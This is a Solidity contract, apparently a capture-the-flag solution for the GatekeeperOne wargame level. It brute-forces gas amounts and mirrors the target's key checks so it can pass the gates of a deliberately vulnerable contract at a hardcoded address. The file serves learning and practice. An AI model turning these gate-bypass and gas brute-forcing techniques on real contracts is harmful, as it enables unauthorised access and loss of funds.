// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

interface GatekeeperOne{
    function enter(bytes8) external returns (bool);
}

contract Hak {


  using SafeMath for uint256;
  address public owner;
  address public entrant;
  address hisAddr = 0xdBc7c99fE6B538631473060E8C2FBA627611d635;

  GatekeeperOne gone = GatekeeperOne(hisAddr);

  constructor() {
    owner = msg.sender;
  }

    function getGasLeft()public view returns(uint) {
        return gasleft();
    }

        function makeModulable(uint zayed) public view returns(uint, uint, uint, bool){
          uint initialGL = gasleft();
        return (initialGL,initialGL.mod(8191),(initialGL.sub(initialGL.mod(8191)+zayed)), (initialGL.sub(initialGL.mod(8191))).mod(8191)==0);
    }


    function call(bytes8 _jma)public returns(uint){
      uint initialGL = gasleft();
      hisAddr.call{gas: initialGL.sub(initialGL.mod(8191)+3832)}(abi.encodeWithSignature("enter(bytes8)", _jma));
      //gone.enter(_jma);
        return (gasleft());
    }

    function callIterate(bytes8 _jma)public{
      for (uint256 i = 0; i < 120; i++) {
      hisAddr.call{gas: i + 150 + 8191 * 3}(abi.encodeWithSignature("enter(bytes8)", _jma));
      }
    }


      function callAddress(bytes8 _jma, address _xx,uint _how)public returns(uint){
      _xx.call{gas: 819100+_how}(abi.encodeWithSignature("enter(bytes8)", _jma));
      //gone.enter(_jma);
        return (gasleft());
    }
    function check30123(bytes8 _gateKey) public view returns(uint64, uint32, uint16, uint16) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
      return (uint64(_gateKey),uint32(uint64(_gateKey)), uint16(uint64(_gateKey)),uint16(uint160((tx.origin))));
    }

      modifier gateTwoHome() {
    require((gasleft().sub(gasleft().mod(8191))).mod(8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enterHereTwo() public view gateTwoHome returns (bool) {
    //entrant = tx.origin;
    return true;
  }

  function enterHereThree(bytes8 _gateKey) public view gateThree(_gateKey) returns (bool) {
    //entrant = tx.origin;
    return true;
  }
  receive() external payable{}
  fallback() external payable{}


}